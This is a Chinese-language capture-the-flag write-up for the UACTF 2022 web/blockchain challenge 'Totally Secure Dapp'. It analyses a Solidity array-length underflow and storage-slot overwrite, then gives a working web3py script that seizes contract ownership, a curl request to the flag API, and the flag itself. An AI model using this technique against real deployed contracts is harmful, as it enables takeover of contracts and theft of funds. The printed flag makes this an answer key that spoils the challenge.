---
title: Blockchain - Totally Secure Dapp
description: 2022 | UACTF | Web
tags:
    - smart contract
---

## 题目

It's on the blockchain, and there's no way anything on the blockchain could ever have any vulnerabilities.

Note, because the contract is on Ropsten, some transactions might fail. If that happens, just keep retrying.

Get test ether from https://faucet.metamask.io/

https://totally-secure-dapp.vercel.app/

[:material-download: `totally-secure-dapp.zip`](static/totally-secure-dapp.zip)

## 解题思路

- https://totally-secure-dapp.vercel.app/ 主要提供了 `New Post` 和展示 Post 的功能，Post 记录上链
- 提供了两份合约代码，Post 相关操作函数位于 `TotallySecureDapp.sol`，当调用者为 `owner` 且合约账户的余额大于 `0.005` 以太时可以触发 `FlagCaptured` 事件

    ```js
    modifier onlyOwner() {
        require(msg.sender == _owner, 'Caller is not the owner');
        _;
    }

    function captureFlag() external onlyOwner {
        require(address(this).balance > 0.005 ether, 'Balance too low');
        _flagCaptured = true;
        emit FlagCaptured(msg.sender);
    }
    ```

- 除此之外，能够调用的函数有 `addPost`、`editPost`、`removePost` 和 `nPost`。注意到 `removePost` 中 `length` 的减法没有使用 `SafeMath` 或在使用前进行判断

    ```js
    function addPost(string title, string content) external {
        Post memory post = Post(title, content);
        _posts.push(post);
        _authors.push(msg.sender);
        emit PostPublished(msg.sender, _posts.length - 1);
    }

    function editPost(
        uint256 index,
        string title,
        string content
    ) external {
        _authors[index] = msg.sender;
        _posts[index] = Post(title, content);
        emit PostEdited(msg.sender, index);
    }

    function removePost(uint256 index) external {
        if (int256(index) < int256(_posts.length - 1)) {
            for (uint256 i = index; i < _posts.length - 1; i++) {
                _posts[i] = _posts[i + 1];
                _authors[i] = _authors[i + 1];
            }
        }
        _posts.length--;
        _authors.length--;
        emit PostRemoved(msg.sender, index);
    }

    function nPosts() public view returns (uint256) {
        return _posts.length;
    }
    ```

- 因为数组长度可控且可编辑指定下标的数组元素，接下来只需要通过 `editPost` 覆盖 `owner` 变量
    - `string` 类型的变量存储方式与 `address` 类型的不同，当长度小于 $32$ 字节时，元素存储在高位，低位存储字符串字节长度，当长度大于 $31$ 字节时，存储方式与数组类似
    - 建议通过 `_authors` 数组完成覆盖操作

    ```js
    // contract Initializable
    bool private _initialized;  // slot 0
    bool private _initializing; // slot 0

    // contract TotallySecureDapp is Initializable
    struct Post {
        string title;
        string content;
    } // 2 slots

    string public _contractId; // slot 1
    address public _owner; // slot 2
    address[] public _authors; // slot 3
    Post[] public _posts; // slot 4
    bool public _flagCaptured; // slot 5
    ```

- 另外，合约 `TotallySecureDapp` 不接受直接转账，所以需要一些特殊手段 >v< 比如 `selfdestruct`

    ```js
    function() external payable {
        revert('Contract does not accept payments');
    }
    ```

- 给 `TotallySecureDapp` 合约实例转账后，通过 web3py 与合约进行交互

    ```py
    from web3 import Web3
    import json, time

    # 在 https://infura.io/ 注册一个账号并创建一个项目可获得 API key
    w3 = Web3(Web3.HTTPProvider("https://ropsten.infura.io/v3/<api-key>"))

    account = w3.eth.account.from_key("<your-private-key>")

    contract_address = "<totallysecuredapp-instance-address>"

    abi = json.loads(open('abi.json').read())
    contract = w3.eth.contract(address=contract_address, abi=abi)

    # 先调用 removePost 使数组长度下溢出
    tx = contract.functions.removePost(1).buildTransaction({"from": account.address, "nonce": w3.eth.getTransactionCount(account.address)})
    signed_tx = account.signTransaction(tx)
    print(w3.eth.sendRawTransaction(signed_tx.rawTransaction).hex())

    time.sleep(30)  # 等待交易确认

    # 修改 owner
    index = 2**256 - int(Web3.soliditySha3(['uint256'], [3]).hex(), 16) + 2
    tx = contract.functions.editPost(index, "unimportant", "unimportant").buildTransaction({"from": account.address, "nonce": w3.eth.getTransactionCount(account.address)})
    signed_tx = account.signTransaction(tx)
    print(w3.eth.sendRawTransaction(signed_tx.rawTransaction).hex())

    time.sleep(30)

    # emit FlagCaptured
    tx = contract.functions.captureFlag().buildTransaction({"from": account.address, "nonce": w3.eth.getTransactionCount(account.address)})
    signed_tx = account.signTransaction(tx)
    print(w3.eth.sendRawTransaction(signed_tx.rawTransaction).hex())
    ```

- [TotallySecureDapp | Address 0x014a2a17aa06c26c660fb4a269ac87849d38fd0a | Etherscan](https://ropsten.etherscan.io/address/0x014a2a17aa06c26c660fb4a269ac87849d38fd0a#events) 可以看到 `FlagCaptured` 事件被成功触发了，但是 Flag 在哪？
- 起初以为是事件的返回值，但查日志也最多只能获得传参。想到是 Web 题，跑去翻了翻源码，发现 `pages/api/secret.ts` 中提供了获取 Flag 的接口，请求参数包括 `userAddress`、`contractAddress` 以及 `userId`

    ```ts
    const { userAddress, contractAddress, userId } = req.body as ReqData;
    ```

    ```ts
    const owner = await contract._owner();
    const flagCaptured = await contract._flagCaptured();
    const balance = await provider.getBalance(contractAddress);
    if (owner === userAddress && flagCaptured && balance.gt(parseEther('0.005'))) {
        const ids = db.collection('users').doc('ids');
        if (!ids) {
            res.status(500).json({ error: 'Failed to load ids' });
            return;
        }
        const id = (await ids.get()).get(userAddress.toLowerCase());
        if (id !== userId) {
            res.status(401).json({ error: 'Unauthorised' });
            return;
        }
        const flag = process.env.FLAG;
        res.status(200).json({ flag: flag });
        return;
    }
    ```

- 合约相关的条件都已满足，还差一个 `userId`，搜了搜源码，在 `components/connector/ConnectModal.tsx` 下找到了

    ```tsx
    window.localStorage.setItem('user-id', id);
    ```

- 在控制台输入 `localStorage.getItem('user-id')` 即可获得对应账户的 `userId`
- 调用 API 接口

    ```bash
    $ curl -d '{"userAddress":"0xe09f6d20E2522F6B971b4516744946CF17BE8432", "contractAddress":"0x014A2a17AA06C26C660FB4A269aC87849d38Fd0A", "userId": "RIHIaESfxzilmF10mmBpH"}' -H "Content-Type: application/json" -X POST https://totally-secure-dapp.vercel.app/api/secret
    {"flag":"UACTF{23411y_m394_5u5_f149}"}
    ```

### Flag

> UACTF{23411y_m394_5u5_f149}